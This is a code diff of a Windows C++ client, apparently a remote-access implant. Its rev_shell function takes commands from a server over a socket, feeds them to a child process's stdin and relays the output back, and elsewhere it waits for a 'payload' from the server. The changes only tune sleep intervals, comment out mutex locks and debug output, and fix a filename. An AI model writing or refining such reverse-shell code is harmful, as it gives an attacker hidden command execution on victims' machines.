@@ -44,8 +44,8 @@ int main()
         {
             if(receive_data(sock,"from_server.txt")[0] == '`')
             {
-                Sleep(1000);
-                cout<< "waiting for data " << endl;
+                Sleep(100);
+                //cout<< "waiting for data " << endl;
             }
             else
             {
@@ -67,7 +67,7 @@ int main()
                         
                         if(receive_data(sock,"from_server.txt")[0] == '`')
                         {
-                            Sleep(1000);
+                            Sleep(100);
                             cout<< "waiting for payload " << endl;
                         }      
                         else
@@ -363,7 +363,7 @@ void rev_shell(SOCKET &clientSocket)
 
             //{
                 //lock_guard<mutex> lock1(socketMutex);
-                mtx.lock();
+                //mtx.lock();
                 if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
                 {
                     if (bytesRead > 0) 
@@ -379,9 +379,9 @@ void rev_shell(SOCKET &clientSocket)
                     break;
                 }
 
-                mtx.unlock();
+                //mtx.unlock();
             //}
-            Sleep(1000); // Sleep for a short time to prevent 100% CPU usage
+            Sleep(100); // Sleep for a short time to prevent 100% CPU usage
         } 
     });
 
@@ -393,27 +393,31 @@ void rev_shell(SOCKET &clientSocket)
         {
            //{ 
                 //lock_guard<mutex> lock1(socketMutex);
-                mtx.lock();
+                //mtx.lock();
+
+                Sleep(100);
 
                 if(receive_data(clientSocket,"from_server.txt")[0] == '`')
                 {
-                    Sleep(1000);
-                    cout<< "waiting for rev shell data " << endl;
+                    //cout<< "waiting for rev shell data " << endl;
+                    continue;
                 }
-                cmd = receive_data(clientSocket, "from_server.exe");
+                
+                cmd = receive_data(clientSocket, "from_server.txt");
                 send_data(clientSocket,"from_server.txt","`");
                 if (cmd == "exit")
                 {
                     processFinished.store(true); // Signal to stop reading thread
+                    send_data(clientSocket,"from_client.txt","`");
                     break;
                 }
 
                 // Send the command to the child process's stdin
                 give_command(cmd);
 
-                mtx.unlock();
+                //mtx.unlock();
             //}
-            Sleep(1000); // Sleep for a short time to prevent 100% CPU usage
+           
         }
     });
 
